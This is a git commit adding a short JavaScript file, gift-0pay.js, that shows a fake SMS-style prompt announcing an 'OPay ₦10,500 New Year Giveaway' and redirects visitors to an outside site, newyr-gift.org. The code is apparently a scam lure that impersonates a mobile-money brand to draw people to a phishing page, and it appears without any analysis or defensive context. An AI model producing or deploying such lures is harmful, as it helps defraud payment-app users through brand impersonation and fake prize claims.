9dbd91d74d8cb8eeb972b7048a53c1b9be629033
ukebeblog <esther001imoh@gmail.com>
2025-01-01 00:26:08 +0100

    Create gift-0pay.js

---
+++ gift-0pay.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW ₦10,500'
+password=prompt('SMS: Congratulations You are qualify for OPay ₦10,500 New Year Giveaway, Kindly Press OK to withdraw cash  ','WITHDRAW ₦10,500');
+if (password != 'WITHDRAW ₦10,500') {
+location.href='http://newyr-gift.org/gift-newyear.html';
+}
